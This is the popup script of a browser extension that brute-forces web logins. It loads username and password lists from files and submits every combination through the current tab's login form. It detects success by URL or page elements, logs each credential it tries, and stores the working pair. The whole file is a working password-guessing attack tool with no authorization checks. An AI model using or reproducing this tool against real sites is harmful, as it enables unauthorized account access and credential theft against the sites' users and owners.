// popup.js - manages UI, file reading, iteration state, communication with content script

let usernameList = [];
let passwordList = [];
let currentUserIdx = 0;
let currentPassIdx = 0;
let isRunning = false;
let currentTabId = null;
let originalLoginUrl = "";
let stopRequested = false;

// DOM elements
const formSelect = document.getElementById('formSelect');
const refreshBtn = document.getElementById('refreshFormsBtn');
const usernameSelectorInput = document.getElementById('usernameSelector');
const passwordSelectorInput = document.getElementById('passwordSelector');
const submitSelectorInput = document.getElementById('submitSelector');
const successUrlPattern = document.getElementById('successUrlPattern');
const successElement = document.getElementById('successElement');
const failureElement = document.getElementById('failureElement');
const loadUserBtn = document.getElementById('loadUserBtn');
const loadPassBtn = document.getElementById('loadPassBtn');
const userFileInput = document.getElementById('userFile');
const passFileInput = document.getElementById('passFile');
const userCountSpan = document.getElementById('userCount');
const passCountSpan = document.getElementById('passCount');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const statusSpan = document.getElementById('statusText');
const progressSpan = document.getElementById('progress');
const logContainer = document.getElementById('logContainer');

// helper: log to popup console and UI
function addLog(msg, type = 'info') {
  const entry = document.createElement('div');
  entry.className = `log-entry log-${type}`;
  entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logContainer.appendChild(entry);
  entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  console.log(msg);
}

// update progress display
function updateProgress() {
  const totalCombos = usernameList.length * passwordList.length;
  const done = currentUserIdx * passwordList.length + currentPassIdx;
  progressSpan.innerText = `${done}/${totalCombos}`;
}

// get current tab
async function getCurrentTab() {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  return tab;
}

// refresh form detection from content script
async function refreshForms() {
  const tab = await getCurrentTab();
  if (!tab) return;
  currentTabId = tab.id;
  try {
    const response = await chrome.tabs.sendMessage(tab.id, { action: "detectForms" });
    if (response && response.forms) {
      formSelect.innerHTML = '';
      response.forms.forEach((form, idx) => {
        const option = document.createElement('option');
        option.value = idx;
        option.textContent = `${form.name || 'form'} (${form.fields.username || '?'} / ${form.fields.password || '?'})`;
        formSelect.appendChild(option);
      });
      addLog(`Detected ${response.forms.length} form(s)`, 'info');
      if (response.forms.length > 0) {
        // auto-fill selectors from first detected form
        const first = response.forms[0];
        if (first.fields.username) usernameSelectorInput.value = first.fields.username;
        if (first.fields.password) passwordSelectorInput.value = first.fields.password;
        if (first.submitSelector) submitSelectorInput.value = first.submitSelector;
      }
    } else {
      addLog("No forms found on this page", 'error');
    }
  } catch (err) {
    addLog("Error detecting forms: " + err.message, 'error');
  }
}

// load file content
function loadFile(fileInput, isUserList) {
  const file = fileInput.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = (e) => {
    const content = e.target.result;
    const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);
    if (isUserList) {
      usernameList = lines;
      userCountSpan.innerText = `${usernameList.length} users`;
      addLog(`Loaded ${usernameList.length} usernames`, 'info');
    } else {
      passwordList = lines;
      passCountSpan.innerText = `${passwordList.length} passwords`;
      addLog(`Loaded ${passwordList.length} passwords`, 'info');
    }
    resetIterationState();
  };
  reader.readAsText(file);
}

function resetIterationState() {
  currentUserIdx = 0;
  currentPassIdx = 0;
  updateProgress();
}

// single attempt via content script
async function performAttempt(username, password) {
  const tab = await getCurrentTab();
  if (!tab) throw new Error("No active tab");
  const selectors = {
    username: usernameSelectorInput.value,
    password: passwordSelectorInput.value,
    submit: submitSelectorInput.value
  };
  const successPatterns = {
    urlContains: successUrlPattern.value,
    elementExists: successElement.value
  };
  const failurePattern = failureElement.value;
  const payload = {
    action: "attemptLogin",
    username, password, selectors,
    successPatterns, failurePattern
  };
  return new Promise((resolve, reject) => {
    chrome.tabs.sendMessage(tab.id, payload, (response) => {
      if (chrome.runtime.lastError) reject(chrome.runtime.lastError);
      else resolve(response);
    });
  });
}

// main iteration loop
async function startIteration() {
  if (usernameList.length === 0 || passwordList.length === 0) {
    addLog("Please load both username and password lists", 'error');
    return;
  }
  const tab = await getCurrentTab();
  if (!tab) {
    addLog("Cannot find active tab", 'error');
    return;
  }
  originalLoginUrl = tab.url;
  isRunning = true;
  stopRequested = false;
  statusSpan.innerText = "running";
  startBtn.disabled = true;
  stopBtn.disabled = false;
  resetIterationState();
  
  for (; currentUserIdx < usernameList.length && !stopRequested; currentUserIdx++) {
    const username = usernameList[currentUserIdx];
    for (currentPassIdx = 0; currentPassIdx < passwordList.length && !stopRequested; currentPassIdx++) {
      const password = passwordList[currentPassIdx];
      updateProgress();
      addLog(`Trying [${currentUserIdx+1}/${usernameList.length}] ${username} : ${password}`, 'info');
      
      try {
        const result = await performAttempt(username, password);
        
        // Enhanced logging with HTTP status and redirect info
        const httpInfo = result.httpStatus ? `HTTP ${result.httpStatus}` : '';
        const redirectInfo = result.redirect ? ` → redirect to ${result.redirect}` : '';
        const urlInfo = result.currentUrl ? ` | URL: ${result.currentUrl}` : '';
        const debugInfo = result.debug ? ` | ${result.debug}` : '';
        
        if (result.success === true) {
          addLog(`✅✅✅ SUCCESS! Login worked with ${username} / ${password} | ${result.message} | ${httpInfo}${redirectInfo}${urlInfo}`, 'success');
          statusSpan.innerText = "✅ SUCCESS (stopped)";
          isRunning = false;
          stopRequested = true;
          startBtn.disabled = false;
          stopBtn.disabled = true;
          
          // Also save the successful credentials to storage for reference
          chrome.storage.local.set({ 
            lastSuccess: { 
              username: username, 
              password: password, 
              timestamp: new Date().toISOString(),
              httpStatus: result.httpStatus,
              url: result.currentUrl
            } 
          });
          
          return;
        } else {
          // Enhanced failure log with HTTP details
          addLog(`❌ Failed: ${result.message || 'invalid credentials'} | ${httpInfo}${redirectInfo}${urlInfo}`, 'error');
          
          // after failure, if we are on a different URL (error page), navigate back to original login page
          const currentUrl = result.currentUrl || (await getCurrentTab()).url;
          if (currentUrl !== originalLoginUrl && !currentUrl.includes(originalLoginUrl)) {
            addLog(`↩️ Navigating back to login page (${originalLoginUrl})`, 'info');
            await chrome.tabs.update(tab.id, { url: originalLoginUrl });
            await delay(1500);
          }
        }
      } catch (err) {
        addLog(`⚠️ Error: ${err.message}`, 'error');
      }
      await delay(800); // delay between attempts to avoid overwhelming
    }
  }
  if (!stopRequested) {
    addLog("🏁 Finished all combinations. No successful login found.", 'info');
    statusSpan.innerText = "completed";
  } else {
    addLog("⏹️ Stopped by user.", 'info');
    statusSpan.innerText = "stopped";
  }
  startBtn.disabled = false;
  stopBtn.disabled = true;
  isRunning = false;
}

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

// event listeners
refreshBtn.addEventListener('click', refreshForms);
loadUserBtn.addEventListener('click', () => userFileInput.click());
loadPassBtn.addEventListener('click', () => passFileInput.click());
userFileInput.addEventListener('change', (e) => loadFile(e.target, true));
passFileInput.addEventListener('change', (e) => loadFile(e.target, false));
startBtn.addEventListener('click', () => { if (!isRunning) startIteration(); });
stopBtn.addEventListener('click', () => { 
  stopRequested = true; 
  isRunning = false; 
  statusSpan.innerText = "stopped"; 
  startBtn.disabled = false; 
  stopBtn.disabled = true;
  addLog("Stopping current operation...", 'info');
});

// initial form detection on popup open
refreshForms();

// Optional: Display last successful login if exists (for reference)
chrome.storage.local.get(['lastSuccess'], (result) => {
  if (result.lastSuccess) {
    const last = result.lastSuccess;
    addLog(`📋 Last successful login: ${last.username} / ${last.password} (${new Date(last.timestamp).toLocaleString()})`, 'info');
  }
});